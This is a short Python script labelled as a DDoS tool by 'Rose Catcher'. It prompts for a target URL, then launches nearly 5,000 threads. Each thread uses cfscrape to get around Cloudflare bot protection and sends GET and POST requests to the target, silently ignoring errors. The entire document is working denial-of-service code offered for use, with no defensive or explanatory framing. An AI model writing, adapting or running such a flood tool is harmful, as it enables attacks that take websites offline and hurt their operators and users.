import cfscrape
import threading
import os
os.system('clear')
print("\n");

print("DDoS BY: Rose Catcher\n")

url = input('Enter url: ')
print("\n")

def afk():
	try:
		attack = cfscrape.create_scraper()
		attack.get(f"{url}")
		attack.post(f"{url}")
	except:
		pass
		
for i in range(1, 5000):
	th = threading.Thread(target=afk)
	th.start()
	print(f"{i} GET {url}")